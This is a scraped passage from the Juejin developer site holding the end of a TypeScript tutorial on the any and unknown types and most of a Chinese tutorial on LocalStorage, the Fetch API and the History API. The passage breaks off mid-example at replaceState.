                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">any的使用场景</h2>
<p>一旦设置为any，类型检查系统会认为这个值不需要检查，一般用于</p>
<p>1.出于特殊原因，需要关闭某些值的类型检查</p>
<p>2.为了适配老旧的js项目，快速迁移到ts，可以把代码设置为any，因为对于老旧js项目很难做到给每个值都加上类型定义</p>
<h2 data-id="heading-1">any带来的问题</h2>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">let</span> <span class="hljs-attr">a</span>:any = <span class="hljs-string">'string'</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">b</span>:number = a <span class="hljs-comment">//可以赋值不会报错</span>

b.<span class="hljs-title function_">toFixed</span>()  <span class="hljs-comment">// 报错</span>
</code></pre>
<p>由于any类型可以赋值给任何类型，所以会污染其他变量，像以上案例，运行时才会爆出错误</p>
<h2 data-id="heading-2">unknown</h2>
<p>和any类型类似，如果设置为unknown，可以赋值任何值，和any区别：</p>
<p>1.unknown类型的变量，只能赋值给any和unknown类型的变量，赋值给其他类型报错</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">let</span> <span class="hljs-attr">a</span>:unknown = <span class="hljs-string">'string'</span>

<span class="hljs-keyword">let</span> <span class="hljs-attr">b</span>:number = a <span class="hljs-comment">//报错</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">c</span>:any = a <span class="hljs-comment">// 不报错</span>
</code></pre>
<p>2.unknown类型的变量不能直接使用变量上的方法和属性</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">let</span> <span class="hljs-attr">a</span>:unknown = <span class="hljs-string">'string'</span>
a.<span class="hljs-title function_">trim</span>() <span class="hljs-comment">// 报错</span>
<span class="hljs-comment">//如果想不报错，可以这么写</span>
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">typeof</span> a === <span class="hljs-string">'string'</span>) {
    a.<span class="hljs-title function_">trim</span>() <span class="hljs-comment">// 不会报错</span>
}
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[浏览器三大核心API：LocalStorage、Fetch API、History API详解]]></title>    <link>https://juejin.cn/post/7581386627677175848</link>    <guid>https://juejin.cn/post/7581386627677175848</guid>    <pubDate>2025-12-09T03:24:34.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581386627677175848" data-draft-id="7581477397506834466" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="浏览器三大核心API：LocalStorage、Fetch API、History API详解"/> <meta itemprop="keywords" content="前端,JavaScript"/> <meta itemprop="datePublished" content="2025-12-09T03:24:34.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="JS_GGbond"/> <meta itemprop="url" content="https://juejin.cn/user/1377017277975032"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            浏览器三大核心API：LocalStorage、Fetch API、History API详解
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1377017277975032/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    JS_GGbond
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T03:24:34.000Z" title="Tue Dec 09 2025 03:24:34 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>欢迎使用我的小程序👇👇👇👇 [俱好用助手]</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/09f4a2fa8257447eba3459146cc6caea~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSlNfR0dib25k:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765855474&amp;x-signature=k%2FZCQWAbgmsKMhHTrNJdpnnq1to%3D" alt="small.png" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-0">引言：为什么这些API如此重要？</h2>
<p>想象一下，你正在构建一个现代化的网页应用。你想让用户的数据在关闭浏览器后依然保存，需要从服务器获取最新信息而不刷新页面，还要实现流畅的页面跳转体验。这就是LocalStorage、Fetch API和History API大显身手的时刻！</p>
<h2 data-id="heading-1">1. LocalStorage：浏览器的“本地笔记本”</h2>
<h3 data-id="heading-2">什么是LocalStorage？</h3>
<p>LocalStorage就像浏览器内置的一个小型数据库，允许你在用户的设备上存储数据。即使用户关闭浏览器或重启电脑，这些数据仍然存在。</p>
<h3 data-id="heading-3">基本用法</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 存储数据</span>
<span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">'username'</span>, <span class="hljs-string">'张三'</span>);
<span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">'theme'</span>, <span class="hljs-string">'dark'</span>);

<span class="hljs-comment">// 读取数据</span>
<span class="hljs-keyword">const</span> username = <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">'username'</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(username); <span class="hljs-comment">// 输出：张三</span>

<span class="hljs-comment">// 删除单个数据</span>
<span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">removeItem</span>(<span class="hljs-string">'theme'</span>);

<span class="hljs-comment">// 清空所有数据</span>
<span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">clear</span>();

<span class="hljs-comment">// 查看存储了多少数据</span>
<span class="hljs-keyword">const</span> count = <span class="hljs-variable language_">localStorage</span>.<span class="hljs-property">length</span>;
</code></pre>
<h3 data-id="heading-4">实际应用场景</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 保存用户偏好设置</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">saveUserPreferences</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> preferences = {
        <span class="hljs-attr">theme</span>: <span class="hljs-string">'dark'</span>,
        <span class="hljs-attr">language</span>: <span class="hljs-string">'zh-CN'</span>,
        <span class="hljs-attr">fontSize</span>: <span class="hljs-number">16</span>
    };
    <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">'preferences'</span>, <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(preferences));
}

<span class="hljs-comment">// 读取偏好设置</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">loadUserPreferences</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> saved = <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">'preferences'</span>);
    <span class="hljs-keyword">if</span> (saved) {
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(saved);
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
}

<span class="hljs-comment">// 记住登录状态</span>
<span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">'isLoggedIn'</span>, <span class="hljs-string">'true'</span>);
<span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">'userToken'</span>, <span class="hljs-string">'abc123xyz'</span>);
</code></pre>
<h3 data-id="heading-5">注意事项</h3>
<ul>
<li><strong>只能存储字符串</strong>：存储对象需用<code>JSON.stringify()</code>，读取用<code>JSON.parse()</code></li>
<li><strong>存储容量有限</strong>：通常为5-10MB，不同浏览器可能有差异</li>
<li><strong>同源策略</strong>：只有同一域名下的页面能访问相同的数据</li>
<li><strong>同步操作</strong>：大量数据可能影响页面性能</li>
</ul>
<h3 data-id="heading-6">LocalStorage vs SessionStorage</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// LocalStorage - 长期存储（关闭浏览器后还在）</span>
<span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">'key'</span>, <span class="hljs-string">'永久保存'</span>);

<span class="hljs-comment">// SessionStorage - 会话存储（标签页关闭就消失）</span>
sessionStorage.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">'key'</span>, <span class="hljs-string">'仅本次会话保存'</span>);
</code></pre>
<h2 data-id="heading-7">2. Fetch API：现代网络请求的“邮差”</h2>
<h3 data-id="heading-8">什么是Fetch API？</h3>
<p>Fetch API提供了一个更简单、更强大的替代方案来替代传统的XMLHttpRequest，用于从服务器获取资源。</p>
<h3 data-id="heading-9">基本用法</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 最简单的GET请求</span>
<span class="hljs-title function_">fetch</span>(<span class="hljs-string">'https://api.example.com/data'</span>)
    .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> response.<span class="hljs-title function_">json</span>())
    .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data))
    .<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'错误:'</span>, error));

<span class="hljs-comment">// 使用async/await更优雅</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">fetchData</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">'https://api.example.com/data'</span>);
        <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);
    } <span class="hljs-keyword">catch</span> (error) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'请求失败:'</span>, error);
    }
}
</code></pre>
<h3 data-id="heading-10">完整请求示例</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// POST请求，发送JSON数据</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">postData</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> userData = {
        <span class="hljs-attr">name</span>: <span class="hljs-string">'张三'</span>,
        <span class="hljs-attr">email</span>: <span class="hljs-string">'zhangsan@example.com'</span>
    };

    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">'https://api.example.com/users'</span>, {
        <span class="hljs-attr">method</span>: <span class="hljs-string">'POST'</span>,
        <span class="hljs-attr">headers</span>: {
            <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/json'</span>,
            <span class="hljs-string">'Authorization'</span>: <span class="hljs-string">'Bearer token123'</span>
        },
        <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(userData)
    });

    <span class="hljs-keyword">if</span> (!response.<span class="hljs-property">ok</span>) {
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'网络响应不正常'</span>);
    }

    <span class="hljs-keyword">return</span> <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();
}

<span class="hljs-comment">// 上传文件</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">uploadFile</span>(<span class="hljs-params">file</span>) {
    <span class="hljs-keyword">const</span> formData = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FormData</span>();
    formData.<span class="hljs-title function_">append</span>(<span class="hljs-string">'file'</span>, file);
    
    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">'https://api.example.com/upload'</span>, {
        <span class="hljs-attr">method</span>: <span class="hljs-string">'POST'</span>,
        <span class="hljs-attr">body</span>: formData
    });
    
    <span class="hljs-keyword">return</span> response.<span class="hljs-title function_">json</span>();
}
</code></pre>
<h3 data-id="heading-11">处理响应</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title function_">fetch</span>(<span class="hljs-string">'https://api.example.com/data'</span>)
    .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> {
        <span class="hljs-comment">// 检查状态码</span>
        <span class="hljs-keyword">if</span> (!response.<span class="hljs-property">ok</span>) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">`HTTP错误! 状态: <span class="hljs-subst">${response.status}</span>`</span>);
        }
        
        <span class="hljs-comment">// 根据内容类型处理响应</span>
        <span class="hljs-keyword">const</span> contentType = response.<span class="hljs-property">headers</span>.<span class="hljs-title function_">get</span>(<span class="hljs-string">'content-type'</span>);
        
        <span class="hljs-keyword">if</span> (contentType.<span class="hljs-title function_">includes</span>(<span class="hljs-string">'application/json'</span>)) {
            <span class="hljs-keyword">return</span> response.<span class="hljs-title function_">json</span>();
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (contentType.<span class="hljs-title function_">includes</span>(<span class="hljs-string">'text/html'</span>)) {
            <span class="hljs-keyword">return</span> response.<span class="hljs-title function_">text</span>();
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">return</span> response.<span class="hljs-title function_">blob</span>(); <span class="hljs-comment">// 二进制数据</span>
        }
    })
    .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> {
        <span class="hljs-comment">// 处理数据</span>
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);
    })
    .<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> {
        <span class="hljs-comment">// 错误处理</span>
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'请求失败:'</span>, error);
    });
</code></pre>
<h2 data-id="heading-12">3. History API：浏览器的“时光机”</h2>
<h3 data-id="heading-13">什么是History API？</h3>
<p>History API允许你在不重新加载页面的情况下操作浏览器的历史记录，是实现单页应用(SPA)的核心技术。</p>
<h3 data-id="heading-14">基本用法</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 获取当前历史记录状态</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(history.<span class="hljs-property">length</span>); <span class="hljs-comment">// 历史记录条数</span>

<span class="hljs-comment">// 后退一页</span>
history.<span class="hljs-title function_">back</span>();

<span class="hljs-comment">// 前进一页</span>
history.<span class="hljs-title function_">forward</span>();

<span class="hljs-comment">// 前进或后退多页</span>
history.<span class="hljs-title function_">go</span>(-<span class="hljs-number">2</span>); <span class="hljs-comment">// 后退两页</span>
history.<span class="hljs-title function_">go</span>(<span class="hljs-number">1</span>);  <span class="hljs-comment">// 前进一页</span>
</code></pre>
<h3 data-id="heading-15">核心功能：pushState和replaceState</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 1. pushState - 添加新历史记录，不刷新页面</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">navigateToPage</span>(<span class="hljs-params">page</span>) {
    <span class="hljs-keyword">const</span> state = { <span class="hljs-attr">page</span>: page, <span class="hljs-attr">timestamp</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() };
    <span class="hljs-keyword">const</span> title = <span class="hljs-string">`页面: <span class="hljs-subst">${page}</span>`</span>;
    <span class="hljs-keyword">const</span> url = <span class="hljs-string">`/<span class="hljs-subst">${page}</span>`</span>;
    
    history.<span class="hljs-title function_">pushState</span>(state, title, url);
    <span class="hljs-title function_">updateContent</span>(page); <span class="hljs-comment">// 更新页面内容</span>
}

<span class="hljs-comment">// 2. replaceState - 替换当前历史记录</span>
